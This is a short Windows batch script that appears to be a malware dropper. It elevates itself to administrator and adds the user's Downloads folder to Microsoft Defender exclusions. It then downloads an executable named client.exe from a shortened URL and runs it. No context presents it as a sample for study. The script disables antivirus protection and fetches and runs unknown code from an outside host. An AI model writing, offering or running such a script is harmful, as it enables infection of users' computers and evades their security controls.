@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

set "url=https://shorturl44.at/zaccJ"
set "output=%USERPROFILE%\Downloads\client.exe"

echo Adding Downloads folder to Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads"

timeout /t 1 >nul

echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

echo Running the downloaded file...
start "" "%output%"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 